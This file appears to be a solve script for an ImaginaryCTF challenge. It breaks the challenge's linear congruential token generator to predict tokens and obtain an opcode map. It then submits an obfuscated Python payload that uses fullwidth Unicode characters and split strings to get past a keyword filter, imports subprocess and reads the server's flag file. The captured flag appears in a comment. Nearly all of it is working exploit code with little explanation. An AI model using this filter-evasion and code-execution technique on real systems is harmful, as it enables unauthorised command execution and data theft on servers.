import httpx
import time
from functools import reduce
from math import gcd
from Crypto.Util.number import isPrime

client = httpx.Client(base_url="http://puzzler7.imaginaryctf.org:9003/")


def get_last_token():
    r = client.post("/token", json={"predictedToken": 1, "futureToken": 1})
    return r.json()["lastToken"]


def break_lcg(s):
    t = [b - a for a, b in zip(s, s[1:])]
    u = []
    for i in range(len(t) - 2):
        u.append(abs(t[i + 2] * t[i] - t[i + 1] ** 2))
    if len(u) == 0:
        return
    m = reduce(gcd, u)
    if isPrime(m):
        a = ((s[2] - s[1]) * pow(s[1] - s[0], -1, m)) % m
        b = (s[1] - a * s[0]) % m
        return a, b, m


def get_abm():
    tokens = [0]
    while True:
        t = get_last_token()
        if t != tokens[-1]:
            tokens.append(t)
            ans = break_lcg(tokens[1:])
            if ans:
                return ans
        time.sleep(1)


# a, b, m = get_abm()
a, b, m = (
    168480397975170540663862303656546382010,
    125576915496332450100655562565484821345,
    233191586322547671147114927775707441047,
)  # may change after restart
print(a, b, m)


def get_opcode():
    last = get_last_token()
    cur = (a * last + b) % m
    future = cur
    for _ in range(int(str(cur)[1]) + 2):
        future = (a * future + b) % m
    r = client.post("/token", json={"predictedToken": cur, "futureToken": future})
    j = r.json()
    if "opCode" not in j:
        time.sleep(1)
        return get_opcode()
    return j["opCode"]


def inv_dict(dt):
    ddt = {}
    for k, v in dt.items():
        ddt[v] = k
    return ddt


opc = get_opcode()
invopc = inv_dict(opc)
print(invopc)
code = "def f(lst):\n\treturn eｖal(chr(95)*2+'impo'+'rt'+chr(95)*2+'(\"subprocess\")').check＿output(['cat','/app/templates/f'+'lag.html']).decode()\n\treturn lst\n"


def xtranslate(user_function, translation):

    parsed = ""
    current_word = ""

    for c in user_function:
        if c in " \n\t\r\"=':,*/+-{}()[]":
            if current_word in translation:
                current_word = translation[current_word]

            parsed += current_word + c
            current_word = ""

        else:
            current_word += c

    return parsed


cc = xtranslate(code, invopc)

from base64 import b64encode
from strange import translate

print(translate(cc, opc))

r = client.post(
    "/algo", json={"algos": [b64encode(cc.encode()).decode(), "a", "b", "c", "d"]}
)
print(r.json()["userOutput"])

# ictf{I_gu355_n0t_3v3n_MTD_c4n_stop_y0u..._sadge_}
